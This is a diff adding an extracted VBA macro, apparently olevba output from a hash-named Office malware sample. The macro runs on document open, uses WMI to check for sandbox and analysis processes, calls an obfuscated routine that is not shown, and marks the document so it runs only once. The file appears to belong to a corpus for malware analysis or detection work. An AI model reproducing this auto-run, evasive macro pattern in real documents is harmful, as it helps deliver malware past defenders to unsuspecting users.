@@ -1,0 +1,34 @@
+Filename     : ./macros/005aef3422110f3e0a60dee4efe6c5db371ca34eba400f32909e3780813dfec8
+OLE stream   : Macros/VBA/ThisDocument
+VBA filename : ThisDocument.cls
+----------------------------------------
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Private Sub Document_Open()
+If ActiveDocument.Variables("wykYqM").Value <> "juryt" And Not gKelhjy("VmRemoteGuest.exe") And Not gKelhjy("tee.exe") Then
+egsdDwwbNSzoBn
+ActiveDocument.Variables("wykYqM").Value = "juryt"
+If ActiveDocument.ReadOnly = False Then
+ActiveDocument.Save
+End If
+End If
+End Sub
+
+Private Function gKelhjy(prfs As String) As Boolean
+Dim ugkFg As Object
+Dim uSgjr As Variant
+Dim iegL As Object
+Set ugkFg = GetObject("winmgmts:")
+Set uSgjr = ugkFg.ExecQuery("Select * from Win32_Process Where Name = '" & prfs & "'")
+If uSgjr.Count > 0 Then
+gKelhjy = True
+Else
+gKelhjy = False
+End If
+End Function
